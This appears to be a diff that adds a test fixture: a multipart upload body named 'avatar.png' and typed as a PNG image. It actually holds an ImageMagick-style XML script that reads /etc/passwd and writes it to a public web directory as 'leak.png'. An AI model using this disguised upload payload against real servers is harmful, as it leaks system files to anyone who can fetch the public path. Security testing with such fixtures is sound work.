@@ -1,0 +1,11 @@
+--X
+Content-Disposition: form-data; name="file"; filename="avatar.png"
+Content-Type: image/png
+
+<?xml version="1.0" encoding="UTF-8"?>
+<image>
+  <read filename="/etc/passwd" />
+  <write filename="/var/www/html/public/leak.png" />
+</image>
+
+--X--
